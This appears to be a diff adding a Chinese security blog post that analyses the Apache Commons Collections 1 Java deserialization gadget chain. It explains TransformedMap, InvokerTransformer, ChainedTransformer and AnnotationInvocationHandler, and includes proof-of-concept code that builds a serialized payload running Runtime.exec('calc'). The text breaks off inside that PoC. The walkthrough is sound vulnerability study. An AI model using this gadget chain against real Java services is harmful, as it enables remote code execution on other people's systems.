@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="cc链1分析">
+<meta property="og:url" content="http://example.com/2021/10/04/cc%E9%93%BE1%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="艾比斯之梦">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/aEDngFfjQ2PqJIi.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/kcBqzJPerwvCguH.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/6vNazyDCVYkjuB8.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/2i5UW3qwYKdLDvk.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/nd3Bs6PfkZVLJTF.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/JbxeKlIHgp47tPB.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/3Q9swTJI1jyaK6n.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/z5dRr2TxCk13Fao.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/VijNh389kvGUmpa.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/GbX5UqRvHopIB3S.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/APIOLYwWUR1dJxZ.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/2i5UW3qwYKdLDvk.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/nd3Bs6PfkZVLJTF.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/6NT7EZVq9XI8glW.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/wuBWHCZf4pgElYD.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/yoxJiOQTrebMGj7.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/NvWyRFP4ZbqOzlh.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/fkErIateV5mlLYT.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/2EvJLlmF1XVxrY7.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/pYj8Nq2Hit7okMg.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/A8iFnxehgZOSDl5.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/TVfYSgN8q1lJ5ZH.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/BmRQAbZMOkn7irN.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/kpWfEFgRSwOuCJH.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/2NZjG3uq54ezE7R.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/p9oy1RqOhsINuik.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/9SdYJzabX8vVqHy.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/KvJ6sriYOMapldP.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/kaAPQfFRM7B43h5.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/D4opIN9BMywuYFE.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/ladFSt4RjOpxQcq.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/sed7grb6QycV52p.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/U2mREeGwDygcQTV.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/Yj6Q93HhBTAWkln.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/qF16sgPphGQawdx.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/nYKrjcaxISzoLTe.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/OMJgejCkAdNfLm9.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/JuQwDaVijEnLrTb.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/03/65sChad2HeFTMzP.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/JtdZIprcLPOMK83.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/HzB6KDSOW48gVwy.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/fKwO8SQJxhEc1Uj.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/K9YIZW4LVMDQyJO.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/o28XeiHRAuJ6WLn.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/04/wbaEB8VlDTGWoRd.png">
+<meta property="article:published_time" content="2021-10-04T13:09:23.000Z">
+<meta property="article:modified_time" content="2021-10-04T13:12:19.683Z">
+<meta property="article:author" content="LaNyer640">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/10/04/aEDngFfjQ2PqJIi.png">
+
+<link rel="canonical" href="http://example.com/2021/10/04/cc%E9%93%BE1%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>cc链1分析 | 艾比斯之梦</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">艾比斯之梦</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我对你的爱，是3+10i</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/04/cc%E9%93%BE1%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://i.loli.net/2021/10/01/JgS6Ude2xi7Afpq.jpg">
+      <meta itemprop="name" content="LaNyer640">
+      <meta itemprop="description" content="道格幼儿园的小朋友">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="艾比斯之梦">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          cc链1分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-10-04 21:09:23 / 修改时间：21:12:19" itemprop="dateCreated datePublished" datetime="2021-10-04T21:09:23+08:00">2021-10-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">java反序列化</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><escape><span id="more"></span></escape></p>
+<h2 id="cc链1简化"><a href="#cc链1简化" class="headerlink" title="cc链1简化"></a>cc链1简化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CommonCollections1 &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">			new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">			new InvokerTransformer(&quot;exec&quot;, new Class[&#123;String.class&#125;,new Object[]&#123;&quot;Calc.exe&quot;&#125;),</span><br><span class="line">	&#125;;//通过数组定义来引用类，不会触发类的初始化</span><br><span class="line">		Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"> 		Map innerMap = new HashMap();</span><br><span class="line"> 		Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">transformerChain);</span><br><span class="line"> 		outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/04/aEDngFfjQ2PqJIi.png" alt="image-20211002163400018">这样就弹到了计算器</p>
+<p>这个过程涉及到下⾯1个接⼝和4类：</p>
+<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，<strong>被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调</strong>。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map:</p>
+<p>这里之所以使用TransformedMap.decorate是因为这里它的构造方法为protected类型,创建对象需要通过TransformedMap.decorate()来获得一个TransformedMap实例</p>
+<p><img src="https://i.loli.net/2021/10/04/kcBqzJPerwvCguH.png" alt="image-20211002164117281"></p>
+<p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类</p>
+<blockquote>
+<p>在计算机程序设计中，<strong>回调函数</strong>，简称<strong>回调</strong>（Callback），是指通过函数参数传递到其他代码的，某一块可执行代码的引用。这一设计允许了底层代码调用在高层定义的子程序。</p>
+<p>就是这么说吧，java中的回调</p>
+<p>回调</p>
+<p><img src="https://i.loli.net/2021/10/04/6vNazyDCVYkjuB8.png" alt="img"></p>
+<p>回调的思想是：</p>
+<ul>
+<li><strong>类A的a()方法调用类B的b()方法</strong></li>
+<li><strong>类B的b()方法执行完毕主动调用类A的callback()方法</strong></li>
+</ul>
+</blockquote>
+<p>在TransformedMap类中有三个方法,它会执行传入的参数的transform()方法</p>
+<p><img src="https://i.loli.net/2021/10/04/2i5UW3qwYKdLDvk.png" alt="image-20211002170439599"></p>
+<p><img src="https://i.loli.net/2021/10/04/nd3Bs6PfkZVLJTF.png" alt="image-20211002170908841"></p>
+<p>在新put传入的时候就会去调用transform方法</p>
+<p><img src="https://i.loli.net/2021/10/04/JbxeKlIHgp47tPB.png" alt="image-20211002171340472"></p>
+<h2 id="transformer"><a href="#transformer" class="headerlink" title="transformer"></a>transformer</h2><p>transformer是一个接口,它只有一个待实现的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface Transformer &#123;</span><br><span class="line">    public Object transform(Object input); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象</p>
+<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>ConstantTransformer ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回</p>
+<p><img src="https://i.loli.net/2021/10/04/3Q9swTJI1jyaK6n.png" alt="image-20211002171601154"></p>
+<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 列化能执⾏任意代码的关键。 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
+<p><img src="https://i.loli.net/2021/10/04/z5dRr2TxCk13Fao.png" alt="image-20211002171729200"></p>
+<p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表</p>
+<p>然后就是下面的transform方法，使用反射的方式获取了想要执行的类的方法。</p>
+<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>该方法首先有一个构造函数,将传入的Transformer类型的数组赋值给iTransformers,这里iTransformers是一个数组</p>
+<p><img src="https://i.loli.net/2021/10/04/VijNh389kvGUmpa.png" alt="image-20211002172428882"></p>
+<p>而在该函数的transform方法中,有意思的来了</p>
+<p><img src="https://i.loli.net/2021/10/04/GbX5UqRvHopIB3S.png" alt="image-20211002172455313"></p>
+<p>它会将前一个transform返回的结果作为后一个对象的传参,假设我们传入的Transformer[]数组中有两个数据</p>
+<blockquote>
+<p>new ConstantTransformer(Runtime.getRuntime())</p>
+<p>new InvokerTransformer(“exec”, new Class[]{String.class},new Object[{“calc”})</p>
+</blockquote>
+<p>这样我们就可以执行系统命令了,当然还有个前提:就是触发TransformedMap中的那三个方法</p>
+<p>那么我们就清楚这里的流程了</p>
+<p><img src="https://i.loli.net/2021/10/04/APIOLYwWUR1dJxZ.png" alt="image-20211002173049864"></p>
+<p>创建了⼀个ChainedTransformer，里面包含了两个Transformer接口的实现类， 第⼀个是<code>ConstantTransformer</code>， 直接返回当前环境的Runtime对象；第⼆个是<code>InvokerTransformer</code>，执⾏Runtime对象的exec⽅法，参数是calc.exe </p>
+<p>之后就是将我们的transformerChain传入到，TransformedMap的decorate方法做修饰，进行初始化。之后当我们调用put方法时，ChainedTransformer的transform方法就会被调用。</p>
+<p>但是这里我们还得思考一个问题，就是如何构造一个序列化对象将其序列化。将outerMap对象变成⼀个序列化流</p>
+<p>我们想命令执行的关键就是触发这三个方法，从而触发transform方法</p>
+<p><img src="https://i.loli.net/2021/10/04/2i5UW3qwYKdLDvk.png" alt="image-20211002170439599"></p>
+<p><img src="https://i.loli.net/2021/10/04/nd3Bs6PfkZVLJTF.png" alt="image-20211002170908841"></p>
+<p>而在<strong>TransformedMap</strong>之中，transformKey和transformValue连个protected方法能有两个public方法调用</p>
+<p><img src="https://i.loli.net/2021/10/04/6NT7EZVq9XI8glW.png" alt="image-20211003120626697"></p>
+<p>而下面的checkSetvalue也能调用transform的方法，所以我们就可以想我们能不能调用checkSetvalue从而调用transform的方法</p>
+<p>而checkSetValue则可以从注释中看到,当调用该类的setvalue方法时,会自动调用checkSetValue方法,而该类的setValue方法则继承于它的父类<code>AbstractInputCheckedMapDecorator</code></p>
+<h2 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h2><p><img src="https://i.loli.net/2021/10/04/wuBWHCZf4pgElYD.png" alt="image-20211003120958387"></p>
+<p>可以看到这里的AbstractInputCheckedMapDecorator有个内部静态类MapEntry。</p>
+<p>this.parent来自<img src="https://i.loli.net/2021/10/04/yoxJiOQTrebMGj7.png" alt="image-20211003121345296"></p>
+<p>这里的this.parent传入的就是TransformedMap,所以我们现在只需要找到一处 <strong>readObject</strong> 方法，只要它调用了 这个内部静态类中的setValue方法,即可完成整个反序列化链</p>
+<p>我们找到了一个类满足条件<code>AnnotationInvocationHandler</code> 类，该类属于 <strong>JDK1.7</strong> 自带</p>
+<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><img src="https://i.loli.net/2021/10/04/NvWyRFP4ZbqOzlh.png" alt="image-20211003181727873"></p>
+<p>这里一步步来讲解</p>
+<p><img src="https://i.loli.net/2021/10/04/fkErIateV5mlLYT.png" alt="image-20211003181755974"></p>
+<p><strong>var1</strong>是我们传入的输入流，随后var1被使用defaultReadObject进行反反序列化。</p>
+<p><img src="https://i.loli.net/2021/10/04/2EvJLlmF1XVxrY7.png" alt="image-20211003182100377"></p>
+<p><strong>var2</strong><strong><img src="https://i.loli.net/2021/10/04/pYj8Nq2Hit7okMg.png" alt="image-20211003182144535"></strong></p>
+<p>进入getInstance</p>
+<p><img src="https://i.loli.net/2021/10/04/A8iFnxehgZOSDl5.png" alt="image-20211003203110130"></p>
+<p>这里前面两个直接过了,来到了第三步,new AnnotationType(var0),这里var0为我们传入的Annotation类型Class跟进去</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212023-bdcac428-e701-1.png"><img src="https://i.loli.net/2021/10/04/TVfYSgN8q1lJ5ZH.png" alt="img"></a></p>
+<p>后面返回了Annotation类型的所有Methods。接着遍历的它的所有方法,这里经过了一个for循环,var6是获得的Methods,var7接着获取了方法名。然后将返回的方法名put到了memberTypes中,这里比较关键,后面会用上,现在大家就记住memberTypes是一个hashmap对象,里面的key是我们传入的Annotation类型Class的方法名字</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212105-d73a794e-e701-1.png"><img src="https://i.loli.net/2021/10/03/BmRQAbZMOkn7irN.png" alt="img"></a></p>
+<p>总结一下这一段就类似于这段代码:</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212214-0015588e-e702-1.png"><img src="https://i.loli.net/2021/10/03/kpWfEFgRSwOuCJH.png" alt="img"></a></p>
+<p><strong>var3</strong></p>
+<p><img src="https://i.loli.net/2021/10/03/2NZjG3uq54ezE7R.png" alt="image-20211003202723234"></p>
+<p><img src="https://i.loli.net/2021/10/03/p9oy1RqOhsINuik.png" alt="image-20211003182340452"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个方法返回var2.memberTypes,我们的memberTypes是一个hashmap,而且key为&quot;value&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>var4</strong>好好讲一下</p>
+<p><img src="https://i.loli.net/2021/10/03/9SdYJzabX8vVqHy.png" alt="image-20211003182421599"></p>
+<p>这里的this.memberValues就是我们传入的 TransformedMap，这是在最开始defaultReadObject时生成的</p>
+<p><img src="https://i.loli.net/2021/10/03/KvJ6sriYOMapldP.png" alt="image-20211003182545543"></p>
+<p>因为 TransformedMap继承了AbstractInputCheckedMapDecorator所以这里使用的就是AbstractInputCheckedMapDecorator中的entrySet,之后使用了一个迭代器，其实获得的是AbstractInputCheckedMapDecorator中的内部类</p>
+<p><img src="https://i.loli.net/2021/10/03/kaAPQfFRM7B43h5.png" alt="image-20211003182752626"></p>
+<p><img src="https://i.loli.net/2021/10/03/D4opIN9BMywuYFE.png" alt="image-20211003182938326"></p>
+<p>在AbstractInputCheckedMapDecorator中有这么几个静态内部类<code>MapEntry</code> 、<code>EntrySetIterator</code>、<code>EntrySet</code></p>
+<p><img src="https://i.loli.net/2021/10/03/ladFSt4RjOpxQcq.png" alt="image-20211003201754680"></p>
+<p><img src="https://i.loli.net/2021/10/03/sed7grb6QycV52p.png" alt="image-20211003201805767"></p>
+<p><img src="https://i.loli.net/2021/10/03/U2mREeGwDygcQTV.png" alt="image-20211003201820507"></p>
+<p><strong>var4</strong>最后得到</p>
+<p><img src="https://i.loli.net/2021/10/03/Yj6Q93HhBTAWkln.png" alt="image-20211003195939161"></p>
+<p>也就是说var4为AbstractInputCheckedMapDecorator的内部类EntrySetIterator</p>
+<p><strong>var5</strong>是调用EntrySetIterator的next方法获得的MapEntry类</p>
+<p><img src="https://i.loli.net/2021/10/03/qF16sgPphGQawdx.png" alt="image-20211003202048585"></p>
+<p>以下就一起说了</p>
+<p><img src="https://i.loli.net/2021/10/03/nYKrjcaxISzoLTe.png" alt="image-20211003202234827"></p>
+<p><strong>var6</strong>获取map的key,这里我们传入一个值为value的key,令var6=”value”</p>
+<p><strong>var7</strong>在<strong>var3</strong>中找键为var6的值,如果在这里没有找到,则返回了null,所以我们需要找一个Annotation类型有方法名和我们传入map的key相同</p>
+<h2 id="java-lang-annotation-Retention"><a href="#java-lang-annotation-Retention" class="headerlink" title="java.lang.annotation.Retention"></a>java.lang.annotation.Retention</h2><p>在该类中有一个value方法</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212227-081636ca-e702-1.png"><img src="https://i.loli.net/2021/10/03/OMJgejCkAdNfLm9.png" alt="img"></a></p>
+<p>所以我们map类再传一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innermap.put(&quot;value&quot;, &quot;xxx&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>其实java.lang.annotation.Target也行</p>
+<p>之后就简单了，调用setValue，完成攻击</p>
+<p><img src="https://i.loli.net/2021/10/03/JuQwDaVijEnLrTb.png" alt="image-20211003204009190"></p>
+<p>借用涛涛的图来看一下攻击流程，额好像都用了涛涛好多图</p>
+<p><img src="https://i.loli.net/2021/10/03/65sChad2HeFTMzP.png" alt="img"></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">package cc;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">public class CommonCollections1 &#123;</span><br><span class="line">    public static Object generatePayload() throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),//这里用反射的方法是因为Runtime.getRuntime()没有实现Serializable接⼝,所以这里用的Runtime.class。class类实现了serializable接⼝</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),//这里的new Class[]&#123;String.class, Class[].class&#125;是说明参数的类型，关于Class[].class和new Class[0]可以看看https://paper.seebug.org/1242/#commonscollections-1</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),//这里用null是因为getRuntime为静态方法，</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innermap = new HashMap();</span><br><span class="line">        innermap.put(&quot;value&quot;,&quot;xxx&quot;);</span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        Object instance = ctor.newInstance(Retention.class,outmap);</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        payload2File(generatePayload(),&quot;obj&quot;);</span><br><span class="line">        payloadTest(&quot;obj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void payload2File(Object instance ,String file) throws Exception&#123;</span><br><span class="line">        ObjectOutputStream out  = new 